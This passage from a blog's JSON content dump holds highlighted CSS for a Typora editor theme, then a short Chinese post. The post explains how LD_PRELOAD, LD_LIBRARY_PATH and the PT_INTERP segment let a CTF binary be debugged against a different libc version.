<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--table-even-row-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">thead</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">th</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">td</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">tr</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*blockquote*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">blockquote</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>: <span class=\"number\">0.2rem</span> solid <span class=\"built_in\">var</span>(--side-bar-bg-color);</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#b4d8e9</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>,<span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">padding-left</span>: <span class=\"number\">2rem</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*list*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">li</span> <span class=\"selector-tag\">p</span><span class=\"selector-class\">.first</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding-left</span>: <span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:first</span>-child,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span><span class=\"selector-pseudo\">:first</span>-child &#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:last-child</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span><span class=\"selector-pseudo\">:last-child</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-task-list-item</span><span class=\"selector-pseudo\">:hover</span> &gt; <span class=\"selector-tag\">input</span>:before,</span><br><span class=\"line\">input[type=<span class=\"string\">&#x27;checkbox&#x27;</span>]:hover:before &#123;</span><br><span class=\"line\">\topacity: <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: <span class=\"number\">0.5s</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--side-bar-bg-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-item</span> <span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">::before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1.2px</span> solid <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-left</span>: -<span class=\"number\">0.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">0.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">0.68rem</span>; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-item</span> <span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">:checked</span><span class=\"selector-pseudo\">::before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding-left</span>: <span class=\"number\">0.125em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">&#x27;✔&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:white;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0.8rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">0.95rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">0.68rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: background-color <span class=\"number\">200ms</span> ease-in-out;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-done</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: line-through;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hr &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-style</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">border-top-style</span>: solid;</span><br><span class=\"line\">    <span class=\"attribute\">border-color</span>: <span class=\"number\">#e7e7e7</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">1px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">2rem</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*highlight*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">mark</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#c7ffe8</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">2px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">44</span>, <span class=\"number\">39</span>, <span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">4px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"number\">2px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*inline code*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">code</span>,tt &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0.6px</span> <span class=\"number\">4px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">2px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">238</span>, <span class=\"number\">238</span>, <span class=\"number\">238</span>, <span class=\"number\">0.39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>,Consolas,Courier, Monospace;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#666666</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"number\">2px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*footnote*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-class\">.md-footnote</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#e4e4e4</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*source code mode*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-typora-default</span> <span class=\"selector-class\">.cm-header</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#524a4a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-typora-default</span> <span class=\"selector-class\">.cm-link</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>:<span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*code block*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-class\">.md-fences</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0.2em</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0.5em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border-radius</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>,Consolas,Courier, Monospace ;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fffdfd</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#a3a3a3</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: none;</span><br><span class=\"line\">\t<span class=\"attribute\">text-shadow</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-fences</span> <span class=\"selector-class\">.code-tooltip</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Name:       material-ocean</span></span><br><span class=\"line\"><span class=\"comment\">  Author:     Mattia Astorino (http://github.com/equinusocio)</span></span><br><span class=\"line\"><span class=\"comment\">  Website:    https://material-theme.site/</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span><span class=\"selector-class\">.CodeMirror</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*.cm-s-inner .CodeMirror-gutters &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background: #ffffff;</span></span><br><span class=\"line\"><span class=\"comment\">  color: #ffffff;</span></span><br><span class=\"line\"><span class=\"comment\">  border: none;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-linenumber</span> &#123;<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-guttermarker</span> &#123; <span class=\"attribute\">color</span>: <span class=\"number\">#FFEE80</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-guttermarker-subtle</span> &#123; <span class=\"attribute\">color</span>: <span class=\"number\">#D0D0D0</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner .CodeMirror-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  border-left: 1px solid #FFCC00;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner.cm-fat-cursor .CodeMirror-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background-color: #FFCC00 !important;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner .cm-animate-fat-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background-color: #FFCC00 !important;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-cursor</span> &#123; <span class=\"attribute\">border-left</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#A9B7C6</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-cursor</span> &#123; <span class=\"attribute\">border-left</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#ffffff</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-selected</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">58</span>, <span class=\"number\">58</span>, <span class=\"number\">59</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span><span class=\"selector-class\">.CodeMirror-focused</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-selected</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-selected</span>&#123; <span class=\"attribute\">background</span>: <span class=\"number\">#d6dce7</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-selectedtext</span> &#123; <span class=\"attribute\">background</span>: <span class=\"number\">#dbdee6</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-overlay</span><span class=\"selector-class\">.CodeMirror-selectedtext</span> &#123; <span class=\"attribute\">background</span>: <span class=\"number\">#B5D6FC</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span><span class=\"selector-pseudo\">::selection</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>&gt;<span class=\"selector-tag\">span</span><span class=\"selector-pseudo\">::selection</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>&gt;<span class=\"selector-tag\">span</span>&gt;<span class=\"selector-tag\">span</span><span class=\"selector-pseudo\">::selection</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>::-moz-selection,</span><br><span class=\"line\">.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,</span><br><span class=\"line\">.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123;</span><br><span class=\"line\">  background: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-activeline-background</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-keyword</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#8979c0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-operator</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#25c494</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#4f5481</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-3</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-type</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#f84f57</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-builtin</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#eca622</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-atom</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#F78C6C</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-number</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#ad7a83</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-def</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#82AAFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-string</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#70be26</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-string-2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#7a232e</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-comment</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#3a4677</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#bb584b</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-tag</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#b44457</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-meta</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#b9b717</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-attribute</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#71498a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-property</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#a075be</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-qualifier</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#f8ce11</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-3</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-type</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fce470</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">1.0</span>);</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#FF5370</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-matchingbracket</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"ubuntu加载不同版本libc","url":"/2021/08/17/mess_ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-snavXZby\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"1review\">1）review</span></h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的—只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>\n<p>然后我就是这样一步一步地变得不会调试的。</p>\n<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>\n<p>呜呜呜，我居然一直忽略了它的灵魂</p>\n<p>所以这一次我一定要解决掉这个问题。</p>\n<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>\n<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>\n<h4><span id=\"2原理\">2）原理</span></h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>\n<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>\n<h5><span id=\"1ld_preload\">1）LD_PRELOAD</span></h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;</code></p>\n<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>\n<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>\n<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>\n<h5><span id=\"2ld_library_path和library_path\">2）LD_LIBRARY_PATH和LIBRARY_PATH</span></h5><p>LD_LIBRARY_PATH用于在<strong><em>程序加载运行期间</em></strong>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>\n<p>LIBRARY_PATH环境变量用于在<strong><em>程序编译期间</em></strong>查找动态链接库时指定查找共享库的路径</p>\n<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>\n<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>\n<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>\n<h5><span id=\"1-pt_interp\">1） PT_INTERP</span></h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>\n<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>\n<h4><span id=\"汇总\">汇总</span></h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>\n<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>\n<h4><span id=\"实际操作\">实际操作</span></h4><p>我们以lonelywolf为例。</p>\n<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>\n<h3><span id=\"参考\">参考</span></h3><p><a href=\"https://www.cnblogs.com/net66/p/5609026.html\"><a href=\"https://www.cnblogs.com/net66/p/5609026.html\">LD_PRELOAD的偷梁换柱之能</a></a></p>\n","categories":["Binary_security"],"tags":["linux primary"]},{"title":"vmware fusion无法复制粘贴问题","url":"/2022/07/15/mess_vmware%20fusion%E6%97%A0%E6%B3%95%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" 